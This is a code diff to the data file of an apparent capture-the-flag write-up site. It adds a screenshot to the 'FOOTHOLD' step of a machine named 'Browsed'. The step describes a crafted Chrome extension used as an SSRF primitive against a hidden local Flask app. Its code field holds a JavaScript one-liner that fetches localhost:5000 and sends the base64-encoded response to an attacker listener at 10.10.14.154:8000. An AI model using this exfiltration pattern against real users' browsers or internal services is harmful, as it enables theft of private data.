@@ -607,7 +607,7 @@
           {
             phase: "FOOTHOLD",
             title: "Chrome Extension SSRF & Background Worker Payload",
-            body: "Pivoted my approach completely. Crafted a clean extension using a background service worker configured with broad host permissions for `127.0.0.1` and `localhost`. This served as my ultimate SSRF primitive, allowing the developer's browser context to silently fetch the hidden Flask app running on port 5000 and exfiltrate the rendered response back to my listener.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+            body: "Pivoted my approach completely. Crafted a clean extension using a background service worker configured with broad host permissions for `127.0.0.1` and `localhost`. This served as my ultimate SSRF primitive, allowing the developer's browser context to silently fetch the hidden Flask app running on port 5000 and exfiltrate the rendered response back to my listener.<br><br><div style='text-align:center;'><img src='Browsed/image.png' alt='image browser' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
             code: "fetch(\"http://localhost:5000/\")\n  .then(r => r.text())\n  .then(d => fetch(\"http://10.10.14.154:8000/?d=\" + btoa(d)));"
           },
           {
